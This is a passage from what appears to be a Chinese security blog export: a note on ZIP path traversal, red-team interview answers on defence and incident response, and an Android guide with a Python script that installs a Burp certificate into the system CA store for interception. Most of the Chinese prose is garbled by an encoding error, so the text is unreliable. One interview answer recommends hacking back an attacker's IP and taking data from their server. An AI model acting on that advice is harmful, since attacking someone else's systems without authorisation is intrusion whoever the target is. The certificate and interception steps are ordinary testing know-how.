<h3 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">å› ä¸ºLinuxç³»ç»Ÿä¸­../ä»£è¡¨å‘ä¸Šçº§ç›®å½•è·³è½¬ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç›¸åº”çš„Zipæ–‡ä»¶ï¼Œåˆ©ç”¨å¤šä¸ª&#x27;../&#x27;ä»è€Œæ”¹å˜zipåŒ…ä¸­æŸä¸ªæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ï¼Œè´¹ç”¨è¯¥æ›¿æ¢æ‰åº”ç”¨åŸæœ‰çš„æ–‡ä»¶ï¼Œå®Œæˆç›®å½•ç©¿è¶Šã€‚è¿™æ ·ä¸¥é‡å¯èƒ½ä¼šå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå±å®³åº”ç”¨ç”¨æˆ·çš„è®¾å¤‡å®‰å…¨å’Œä¿¡æ¯å®‰å…¨</span><br><span class="line"></span><br><span class="line">Java ä»£ç åœ¨è§£å‹ zip æ–‡ä»¶æ—¶ï¼Œä¼šä½¿ç”¨åˆ° ZipEntry ç±»çš„ getName() æ–¹æ³•ï¼Œå¦‚æœ zip æ–‡ä»¶ä¸­åŒ…å« ../ çš„å­—ç¬¦ä¸²ï¼Œè¯¥æ–¹æ³•è¿”å›å€¼ä¼šåŸæ ·è¿”å›ã€‚å¦‚æœæ²¡æœ‰è¿‡æ»¤æ‰ getName() è¿”å›å€¼ä¸­çš„ ../ å­—ç¬¦ä¸²ï¼Œç»§ç»­è§£å‹ç¼©æ“ä½œï¼Œå°±ä¼šåœ¨å…¶ä»–ç›®å½•ä¸­åˆ›å»ºè§£å‹çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>ç§»åŠ¨å®‰å…¨</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>APK</tag>
        <tag>Drozer</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¢é˜Ÿé¢è¯•</title>
    <url>/%E5%85%AB%E8%82%A1%E6%96%87.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><ol>
<li><p>å¸¸è§å®‰å…¨è®¾å¤‡ä¹‹é—´çš„åŒºåˆ«</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">WAFï¼šä¸“é—¨å¯¹WEBè¿›è¡Œé˜²æŠ¤çš„åº”ç”¨ç¨‹åºï¼Œå¯¹httpæµé‡è¿›è¡Œç‰¹å¾æ£€æµ‹ï¼Œå¹¶åŠæ—¶æ‹¦æˆªã€å°ç¦IPç­‰æªæ–½ï¼›</span><br><span class="line">é˜²ç«å¢™ï¼šä¸»è¦åœ¨ä¸‰å±‚ã€å››å±‚è¿›è¡Œè¿‡æ»¤ï¼Œæ ¹æ®è§„åˆ™è¿›è¡Œæ‹¦æˆªæˆ–è€…æ”¾è¡Œï¼›</span><br><span class="line">IDS: å¯¹äº¤æ¢æœºé•œåƒè¿‡æ¥çš„æµé‡è¿›è¡Œæ£€æµ‹ï¼Œæ ¹æ®ç‰¹å¾è¿›è¡ŒåŒ¹é…ç„¶åå‘Šè­¦ï¼Œä¸€èˆ¬æ—è·¯éƒ¨ç½²ï¼›</span><br><span class="line">IPSï¼šåœ¨æ£€æµ‹æµé‡çš„åŸºç¡€ä¹‹ä¸Šï¼Œè¿˜å¯ä»¥æ‹¦æˆªå±é™©çš„æµé‡ï¼Œä¸»è¦éƒ¨ç½²åœ¨å‡ºå…¥å£çš„ä¸€äº›åœ°æ–¹ï¼Œå½¢æˆä¸€æ¡ä¸²è¡Œé“¾è·¯ï¼›</span><br><span class="line">æ€åŠ¿æ„ŸçŸ¥ï¼šæ•´ä¸ªç½‘ç»œè¿›è¡Œçš„ç›‘æ§ï¼Œå®æ—¶æ±‡æŠ¥æ”»å‡»æºã€æ”»å‡»äº‹ä»¶ï¼Œç”šè‡³è¿˜å¯ä»¥é¢„æµ‹æç¤ºä¸‹ä¸€æ­¥çš„æ”»å‡»æ–¹å‘ï¼Œæå‰é˜²å¾¡ï¼›</span><br><span class="line">èœœç½ï¼šæ•…æ„éƒ¨ç½²çš„å¸¦æœ‰æ¼æ´çš„ä¸€äº›ç³»ç»Ÿï¼Œä¸»è¦å¥—å–æ”»å‡»è€…çš„ä¸€äº›æ”»å‡»æ‰‹æ³•ã€å·¥å…·ç­‰ç­‰ï¼Œå½“ç„¶äº†ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šèµ·åˆ°äº†é˜²å¾¡ä½œç”¨ï¼›æ ¹æ®äº¤äº’å¼ç¨‹åº¦ä¸€èˆ¬åˆ†ä¸ºä½ä¸­é«˜ä¸‰ç§èœœç½ï¼Œæœ€å¸¸ç”¨çš„å¼€æºèœœç½ä¸€èˆ¬æ˜¯hfishingï¼›</span><br><span class="line">å¨èƒæƒ…æŠ¥ï¼šå¯¹æ”»å‡»äº‹ä»¶è¿›è¡Œçš„æ€»ç»“ï¼Œå½¢æˆçš„æŠ¥å‘Šï¼Œæœ€æœ‰æ„ä¹‰/æœ€å…·æœ‰ä»£è¡¨æ€§çš„è¦çœ‹é‡Œé¢çš„IOCï¼ˆæ”»å‡»çš„ç‰¹å¾ï¼‰ã€‚æ¥æºï¼šå¾®æ­¥åœ¨çº¿ã€XXXå¨èƒæƒ…æŠ¥ä¸­å¿ƒï¼Œåœ¨äº‘æ²™ç®±é‡Œé¢è¿è¡Œå¯ä»¥ç¨‹åºï¼Œæ ¹æ®ç‰¹å¾/IOCè¿›è¡Œåˆ†æï¼›</span><br><span class="line">EDRï¼šæ ¹æ®ç‰¹å¾åº“ã€è¡Œä¸ºå¯¹ç»ˆç«¯è¿›è¡Œç›‘æ§ã€é˜²æŠ¤ã€é«˜å±è¡Œä¸ºçš„ç»„ç»‡ã€‚</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ€ä¹ˆåˆ¤æ–­è®¾å¤‡æ˜¯ä¸æ˜¯è¯¯æŠ¥</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. çœ‹æ¥æºIPï¼šå›½å†…çš„/å›½å¤–çš„ã€å†…éƒ¨æ¥æº/å¤–éƒ¨æ¥æºã€è®¿é—®é¢‘ç‡ã€æœ‰æ²¡æœ‰å…¶ä»–æ”»å‡»è¡Œä¸ºçš„è®°å½•ï¼ˆå®‰å…¨è®¾å¤‡&amp;å¨èƒæƒ…æŠ¥ï¼‰ï¼›</span><br><span class="line">2. äººå·¥åˆ†ææµé‡ç‰¹å¾ï¼šè¯·æ±‚é‡Œé¢æœ‰æ²¡æœ‰ä¸€äº›æ¯”è¾ƒæ•æ„Ÿçš„æµé‡ç‰¹å¾/æ•æ„Ÿçš„å‡½æ•°åå…³é”®å­—ã€å“åº”å†…å®¹æ˜¯ä¸æ˜¯åŒ…å«äº†æ•æ„Ÿä¿¡æ¯/å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</span><br></pre></td></tr></table></figure>
</li>
<li><p>windowså…¥ä¾µæ’æŸ¥</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. æ¶æ„è´¦å·ï¼šnet user/net localgroup/æ³¨å†Œè¡¨æ‰¾å½±å­è´¦æˆ·/åœ¨äº‹ä»¶ç®¡ç†å™¨çš„widnowså®‰å…¨æ—¥å¿—ä¸­ï¼Œæ‰¾å‡ºç™»å½•çš„ç”¨æˆ·ï¼›</span><br><span class="line">2. netstat -anoè·å–å¤–éƒ¨é“¾æ¥ipï¼Œç„¶ååˆ°å¨èƒæƒ…æŠ¥ä¸­å¿ƒè¿›è¡Œåˆ¤æ–­</span><br><span class="line">3. å¯åŠ¨é¡¹æ’æŸ¥ã€è®¡åˆ’ä»»åŠ¡</span><br><span class="line">4. everythingæŸ¥çœ‹æ–°å¢çš„ä¸€äº›æ–‡ä»¶ï¼Œé‡ç‚¹ç­›é€‰exe/vbs/dllï¼Œé€šè¿‡äº‘æ²™ç®±è¿›è¡Œåœ¨çº¿åˆ¤æ–­</span><br><span class="line">5. æ—¥å¿—åˆ†æ4625æ‰¾å¤±è´¥çš„æ—¥å¿—ã€4672ç®¡ç†å‘˜ç™»å½•ã€4688æ‰¾æ–°åˆ›å»ºçš„æ—¥å¿—</span><br></pre></td></tr></table></figure>
</li>
<li><p>Linuxå…¥ä¾µæ’æŸ¥</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. è´¦å·å®‰å…¨ï¼šåˆ—å‡ºæ‰€æœ‰ç‰¹æƒç”¨æˆ·ã€sudoç”¨æˆ·ã€è¿œç¨‹ç™»å½•ç”¨æˆ·ï¼›å†å²å‘½ä»¤ï¼Œå¯ä»¥åœ¨/etc/profileæ–‡ä»¶ä¸­é…ç½®è®°å½•å‘½ä»¤æ—¶ï¼ŒåŒæ—¶è®°å½•IPåœ°å€</span><br><span class="line">2. ss -tulpnaæ‰¾å‡ºæ‰€æœ‰ç½‘ç»œè¿æ¥å’Œå¯¹åº”çš„è¿›ç¨‹</span><br><span class="line">3. å¯åŠ¨é¡¹æ’æŸ¥ï¼ˆ/etc/rc.d/rc*.d/ï¼‰ã€å®šæ—¶ä»»åŠ¡ï¼ˆ/var/spool/cron/ /etc/crontabï¼‰</span><br></pre></td></tr></table></figure>
</li>
<li><p>æº¯æºååˆ¶</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. ç¡®è®¤æ”»å‡»äº‹ä»¶ä¹‹åï¼Œé€šè¿‡ç³»ç»Ÿæ—¥å¿—ã€ç½‘ç»œæµé‡å®šä½åˆ°æ”»å‡»è€…ipï¼›</span><br><span class="line">2. é€šè¿‡ä¸€äº›åœ¨çº¿ç½‘ç«™ip138ã€ç«™é•¿ä¹‹å®¶åæŸ¥åŸŸåï¼Œå°½é‡æ‰¾åˆ°æ”»å‡»è€…çš„ä¸ªäººä¿¡æ¯ï¼›</span><br><span class="line">3. åæ‰“æ”»å‡»è€…ipï¼Œæ‰¾åˆ°vpsä¸Šé—ç•™çš„ä¸ªäººæ•°æ®ï¼ŒæŸ¥çœ‹ç™»å½•æ—¥å¿—ï¼Œæ‰¾å‡ºä¸Šä¸€æ¬¡çš„ç™»å½•ipï¼›</span><br><span class="line">4. éƒ¨ç½²èœœç½ï¼Œå¥—å–æ”»å‡»è€…çš„å·¥å…·ä¿¡æ¯ã€å­—å…¸ä¿¡æ¯ã€æ”»å‡»çš„ç›®æ ‡ç­‰æ”»å‡»æ‰‹æ³•</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>çº¢é˜Ÿ</category>
      </categories>
      <tags>
        <tag>é¢è¯•</tag>
        <tag>å…«è‚¡æ–‡</tag>
        <tag>é¢ç»</tag>
      </tags>
  </entry>
  <entry>
    <title>ç§»åŠ¨å®‰å…¨</title>
    <url>/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h1><blockquote>
<ol>
<li>å¯¼å‡ºburpè¯ä¹¦ &#x3D;&#x3D;&gt; è½¬ä¸ºâ€hashValue.0â€è¿™ä¸ªæ–‡ä»¶å &#x3D;&#x3D;&gt; ç§»åŠ¨åˆ°å®‰å“ç³»ç»Ÿè¯ä¹¦è·¯å¾„ä¸­ï¼ˆ&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;ï¼‰</li>
<li>å®‰è£…ä»£ç†è½¬å‘æ’ä»¶ï¼šappproxy.apk</li>
<li>å®‰è£…ç›¸å…³çš„bpæ’ä»¶ï¼šHaEã€apiFinderç­‰</li>
</ol>
</blockquote>
<ol>
<li><p>è‡ªåŠ¨è½¬æ¢è¯ä¹¦æ ¼å¼å¹¶é€šè¿‡adbä¸Šä¼ åˆ°&#x2F;sdcard&#x2F;downloadç›®å½•ä¸‹</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Android ç³»ç»Ÿè¯ä¹¦è½¬æ¢ &amp; ä¸Šä¼ å·¥å…·</span></span><br><span class="line"><span class="string">æ”¯æŒä»»æ„ X.509 è¯ä¹¦ï¼ˆDER/PEM/PFX/PEM å†…åµŒï¼‰â†’ Android 7+ æ ¼å¼ *.0</span></span><br><span class="line"><span class="string">author : K0u</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AndroidCertConverter</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.adb_available = <span class="variable language_">self</span>._check_adb()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------- å·¥å…· -------------------- #</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_check_adb</span>(<span class="params">self</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subprocess.run([<span class="string">&#x27;adb&#x27;</span>, <span class="string">&#x27;version&#x27;</span>], capture_output=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> (subprocess.CalledProcessError, FileNotFoundError):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------- æ ¼å¼ç»Ÿä¸€ -------------------- #</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ensure_pem</span>(<span class="params">self, cert_path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;DER-&gt;PEMï¼ˆå¦‚éœ€è¦ï¼‰å¹¶è¿”å› PEM è·¯å¾„&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subprocess.run([<span class="string">&#x27;openssl&#x27;</span>, <span class="string">&#x27;x509&#x27;</span>, <span class="string">&#x27;-in&#x27;</span>, cert_path, <span class="string">&#x27;-noout&#x27;</span>],</span><br><span class="line">                           check=<span class="literal">True</span>, capture_output=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span> cert_path          <span class="comment"># å·²æ˜¯ PEM</span></span><br><span class="line">        <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">            tmp = tempfile.NamedTemporaryFile(delete=<span class="literal">False</span>, suffix=<span class="string">&#x27;.pem&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                subprocess.run([<span class="string">&#x27;openssl&#x27;</span>, <span class="string">&#x27;x509&#x27;</span>, <span class="string">&#x27;-inform&#x27;</span>, <span class="string">&#x27;DER&#x27;</span>,</span><br><span class="line">                                <span class="string">&#x27;-in&#x27;</span>, cert_path, <span class="string">&#x27;-out&#x27;</span>, tmp.name], check=<span class="literal">True</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+] è‡ªåŠ¨ DERâ†’PEM ï¼š<span class="subst">&#123;tmp.name&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> tmp.name</span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[-] æ— æ³•è¯†åˆ«çš„è¯ä¹¦æ ¼å¼&#x27;</span>)</span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_subject_hash_old</span>(<span class="params">self, pem_path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;è¿”å› 8 ä½ subject_hash_old&quot;&quot;&quot;</span></span><br><span class="line">        r = subprocess.run([<span class="string">&#x27;openssl&#x27;</span>, <span class="string">&#x27;x509&#x27;</span>, <span class="string">&#x27;-subject_hash_old&#x27;</span>,</span><br><span class="line">                            <span class="string">&#x27;-in&#x27;</span>, pem_path], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> r.stdout.strip().split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------- ä¸»è½¬æ¢ -------------------- #</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">convert_to_android_format</span>(<span class="params">self, cert_path: <span class="built_in">str</span>, out_dir: <span class="built_in">str</span> = <span class="string">&#x27;.&#x27;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        pem_path = <span class="variable language_">self</span>.ensure_pem(cert_path)</span><br><span class="line">        hash_val = <span class="variable language_">self</span>._get_subject_hash_old(pem_path)</span><br><span class="line">        out_file = os.path.join(out_dir, <span class="string">f&#x27;<span class="subst">&#123;hash_val&#125;</span>.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pem_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(out_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data.endswith(<span class="string">b&#x27;\n&#x27;</span>):</span><br><span class="line">                f.write(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pem_path != cert_path:           <span class="comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line">            os.remove(pem_path)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Android è¯ä¹¦å·²ç”Ÿæˆ ï¼š<span class="subst">&#123;out_file&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> out_file</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------- ADB ä¸Šä¼  -------------------- #</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_via_adb</span>(<span class="params">self, cert_path: <span class="built_in">str</span>, device_path: <span class="built_in">str</span> = <span class="string">&quot;/sdcard/Download&quot;</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.adb_available:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] ADB ä¸å¯ç”¨&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        dev_list = subprocess.run([<span class="string">&#x27;adb&#x27;</span>, <span class="string">&#x27;devices&#x27;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;device&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> dev_list.stdout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] æœªæ£€æµ‹åˆ°è¿æ¥è®¾å¤‡&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        subprocess.run([<span class="string">&#x27;adb&#x27;</span>, <span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;mkdir&#x27;</span>, <span class="string">&#x27;-p&#x27;</span>, device_path], capture_output=<span class="literal">True</span>)</span><br><span class="line">        target = <span class="string">f&#x27;<span class="subst">&#123;device_path&#125;</span>/<span class="subst">&#123;os.path.basename(cert_path)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subprocess.run([<span class="string">&#x27;adb&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, cert_path, target], check=<span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] ä¸Šä¼ å®Œæˆ ï¼š<span class="subst">&#123;target&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] ADB ä¸Šä¼ å¤±è´¥&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------- æç¤º -------------------- #</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_instructions</span>(<span class="params">self, filename: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n---- åç»­æ“ä½œï¼ˆéœ€ rootï¼‰ ----&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;adb shell&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;su&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mount -o remount,rw /system&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mv /sdcard/Download/<span class="subst">&#123;filename&#125;</span> /system/etc/security/cacerts/&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;chmod 644 /system/etc/security/cacerts/<span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mount -o remount,ro /system&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;reboot&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;----------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------- CLI -------------------- #</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;è¯ä¹¦è½¬æ¢ &amp; ADB ä¸Šä¼ &#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;cert&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;åŸå§‹è¯ä¹¦æ–‡ä»¶ï¼ˆDER/PEM/PFX å‡å¯ï¼‰&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output-dir&#x27;</span>, default=<span class="string">&#x27;.&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;è¾“å‡ºç›®å½•&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--device-path&#x27;</span>, default=<span class="string">&#x27;/sdcard/Download&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;è®¾å¤‡ç›®å½•&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--no-upload&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;ä»…è½¬æ¢ï¼Œä¸ä¸Šä¼ &#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    converter = AndroidCertConverter()</span><br><span class="line">    cert_0 = converter.convert_to_android_format(args.cert, args.output_dir)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.no_upload:</span><br><span class="line">        ok = converter.upload_via_adb(cert_0, args.device_path)</span><br><span class="line">        <span class="keyword">if</span> ok:</span><br><span class="line">            converter.show_instructions(os.path.basename(cert_0))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\n[-] ä¸Šä¼ å¤±è´¥ï¼Œè¯ä¹¦å·²ç”Ÿæˆï¼š<span class="subst">&#123;cert_0&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\n[+] è½¬æ¢å®Œæˆï¼š<span class="subst">&#123;cert_0&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">           __                                      __             ______   ________   ______  </span></span><br><span class="line"><span class="string">          /  |                                    /  |           /      \\ /        | /      \\ </span></span><br><span class="line"><span class="string">  _______ $$ |____    ______    ______   __    __ $$/  _______  /$$$$$$  |$$$$$$$$/ /$$$$$$  |</span></span><br><span class="line"><span class="string"> /       |$$      \\  /      \\  /      \\ /  \\  /  |/  |/       \\ $$ \\__$$/ $$ |__    $$ |  $$/ </span></span><br><span class="line"><span class="string">/$$$$$$$/ $$$$$$$  | $$$$$$  |/$$$$$$  |$$  \\/$$/ $$ |$$$$$$$  |$$      \\ $$    |   $$ |      </span></span><br><span class="line"><span class="string">$$      \\ $$ |  $$ | /    $$ |$$ |  $$ | $$  $$&lt;  $$ |$$ |  $$ | $$$$$$  |$$$$$/    $$ |   __ </span></span><br><span class="line"><span class="string"> $$$$$$  |$$ |  $$ |/$$$$$$$ |$$ \\__$$ | /$$$$  \\ $$ |$$ |  $$ |/  \\__$$ |$$ |_____ $$ \\__/  |</span></span><br><span class="line"><span class="string">/     $$/ $$ |  $$ |$$    $$ |$$    $$/ /$$/ $$  |$$ |$$ |  $$ |$$    $$/ $$       |$$    $$/ </span></span><br><span class="line"><span class="string">$$$$$$$/  $$/   $$/  $$$$$$$/  $$$$$$/  $$/   $$/ $$/ $$/   $$/  $$$$$$/  $$$$$$$$/  $$$$$$/  </span></span><br><span class="line"><span class="string">                                                                                              </span></span><br><span class="line"><span class="string">                                        support: .pem .crt .cer .key .der .cer .pfx .p12</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203202150977.png" alt="image-20251203202150977"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203202603982.png" alt="image-20251203202603982"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203202634914.png" alt="image-20251203202634914"></p>
</li>
<li><p>å¯åŠ¨appproxyï¼Œé€‰æ‹©éœ€è¦æŠ“åŒ…çš„ç¨‹åºä»¥åŠé…ç½®ç›¸åº”çš„ä»£ç†</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203205504045.png" alt="image-20251203205504045"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203205317743.png" alt="image-20251203205317743"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203220911475.png" alt="image-20251203220911475"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203220932614.png" alt="image-20251203220932614"></p>
</li>
</ol>
<h1 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h1><h2 id="æŸ¥å£³"><a href="#æŸ¥å£³" class="headerlink" title="æŸ¥å£³"></a>æŸ¥å£³</h2><p>APKå°±æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹ä¹‹åå°±èƒ½çœ‹åˆ°å¾ˆå¤šä»£ç æ–‡ä»¶ä»¥åŠäºŒè¿›åˆ¶æ–‡ä»¶ã€‚æŸ¥å£³çš„åŸç†å°±æ˜¯å°†apkè§£å‹ä¹‹åï¼Œè¯»å–é‡Œé¢æ‰€æœ‰â€.soâ€ç±»å‹çš„æ–‡ä»¶åï¼Œæ ¹æ®æ–‡ä»¶ååˆ¤æ–­å¯¹åº”çš„å£³ç±»å‹ï¼Œä¸cmsæŒ‡çº¹è¯†åˆ«æ˜¯ä¸€æ ·çš„é“ç†ï¼Œç”šè‡³æ›´ç®€å•ï¼Œå…³é”®åœ¨äºæŒ‡çº¹åº“çš„å¼ºå¤§ã€‚</p>
<ol>
<li><p>è‡ªå·±å†™ä¸€ä¸ªè„šæœ¬ï¼ˆApkScan-PKIDæ—©å°±ä¸æ›´æ–°äº†ï¼Œä¸”æŒ‡çº¹å¤ªè€ï¼Œä¸å»ºè®®ä½¿ç”¨ï¼‰</p>
</li>
